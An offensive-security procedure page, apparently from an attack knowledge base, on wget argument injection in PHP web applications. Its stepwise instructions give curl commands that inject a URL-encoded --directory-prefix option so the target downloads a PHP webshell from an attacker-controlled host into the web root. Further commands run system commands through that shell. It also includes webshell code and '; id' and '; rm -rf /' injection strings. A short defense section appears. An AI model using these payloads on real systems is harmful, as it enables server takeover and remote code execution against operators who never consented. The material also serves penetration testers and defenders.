---
type: procedure
description: >-
  Exploits argument injection in wget invocations via unsanitized user input in
  PHP applications to achieve unauthorized file writes or remote code execution.
tactics:
  - '[[Execution]]'
techniques:
  - '[[Unix Shell]]'
  - '[[Remote File Copy]]'
sub_techniques: []
tags:
  - argument-injection
  - wget
  - rce
  - php
  - command-injection
commands:
  - '[[commands/curl-send-wget-injection-payload]]'
tools: []
platforms:
  - Linux
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# WGET-Argument-Injection

## Summary

The WGET Argument Injection procedure targets web applications that use the wget utility to download files based on user-supplied URLs without proper sanitization. By crafting the URL parameter to include wget options (such as --directory-prefix), attackers can redirect downloads to arbitrary locations on the server, enabling unauthorized file placement, webshell deployment, or further exploitation leading to remote code execution (RCE). This technique bypasses basic shell escaping like escapeshellcmd, as it injects program arguments rather than shell metacharacters.

## Description

In vulnerable PHP applications, a download feature might invoke wget via system('wget ' . $url), where $url is user-controlled. Even with escapeshellcmd to prevent shell injection (e.g., '; rm -rf /'), attackers can prepend wget options to the URL, such as "--directory-prefix=/var/www/html http://attacker.com/shell.php". This results in the executed command becoming "wget --directory-prefix=/var/www/html http://attacker.com/shell.php", downloading the file to the web root for later access and execution. This is common in legacy file download scripts and can chain with other vulnerabilities for persistence or data exfiltration. The target environment is typically Linux-based web servers running PHP, with the attack delivered via HTTP requests to the vulnerable endpoint.

## Requirements

1. Network access to the vulnerable web application endpoint (e.g., GET /download?url=...).
2. An attacker-controlled HTTP server to host the malicious payload file (e.g., a PHP webshell).
3. Knowledge of writable directories on the target (e.g., /var/www/html for web-accessible files).
4. Tools like curl for sending crafted requests (pre-installed on most systems).

## Defense

- Validate and whitelist user-supplied URLs to ensure they are valid HTTP/HTTPS links without command-line options.
- Use safer alternatives like PHP's file_get_contents() or curl with strict URL parsing instead of system() calls to external binaries.
- Implement web application firewalls (WAFs) to detect anomalous URL patterns containing '--' or wget options.
- Run applications in chrooted or containerized environments to limit file write access.
- Enable logging of system() calls and monitor for unexpected file creations in sensitive directories.

## Objectives

1. Inject wget arguments to redirect file downloads to attacker-chosen locations.
2. Deploy malicious files (e.g., webshells) to enable persistent access or RCE.
3. Verify successful injection by accessing the placed file or observing server behavior.

## Instructions

### Step 1: Identify and Test the Vulnerable Endpoint

**Context**: Confirm the download functionality works with a benign URL and identify the parameter (typically 'url'). This establishes a baseline before injection.

Send a normal request to the endpoint using [[commands/curl-send-wget-injection-payload]] with a safe URL:

```bash
curl "http://target.com/download?url=http://example.com/test.txt"
```

> This step verifies the endpoint executes wget without errors. Replace http://target.com/download with the actual vulnerable URL.

**Expected Output**: HTTP 200 response or success message indicating the file was downloaded (e.g., to a temp directory).

### Step 2: Craft and Send the Injection Payload

**Context**: Construct the URL parameter to inject the --directory-prefix option, forcing wget to save the file to a web-accessible directory like /var/www/html. Host a malicious PHP shell on your server (e.g., shell.php with <?php system($_GET['cmd']); ?>).

Use the vulnerable code pattern as reference: [[codes/Vulnerable-PHP-System-WGET-Call]]. Send the injected payload using [[commands/curl-send-wget-injection-payload]]:

```bash
curl "http://target.com/download?url=%2D%2Ddirectory%2Dprefix%3D%2Fvar%2Fwww%2Fhtml%20http%3A%2F%2Fyourserver.com%2Fshell.php"
```

> URL-encode the payload to bypass basic filters: --directory-prefix=/var/www/html becomes %2D%2Ddirectory%2Dprefix%3D%2Fvar%2Fwww%2Fhtml%20. This executes as "wget --directory-prefix=/var/www/html http://yourserver.com/shell.php" on the target.

**Expected Output**: HTTP response confirming download (may vary by app), with the file now at http://target.com/shell.php.

### Step 3: Verify and Exploit the Placed File

**Context**: Access the downloaded file to confirm injection success and achieve RCE. If the directory is web-accessible, browse to it; otherwise, chain with another vulnerability.

Use a browser or curl to interact with the shell:

```bash
curl "http://target.com/shell.php?cmd=whoami"
```

> This executes commands via the webshell. Monitor for errors like permission denied, which indicate need for a different directory (e.g., /tmp).

**Expected Output**: Output of the command (e.g., 'www-data' for whoami), confirming RCE.

### Decision Point
If injection fails (e.g., 400 Bad Request), try alternative options like -O /path/file or test without escapeshellcmd if source code confirms it's absent. If shell metas are not escaped, append '; id' to the URL for direct RCE.
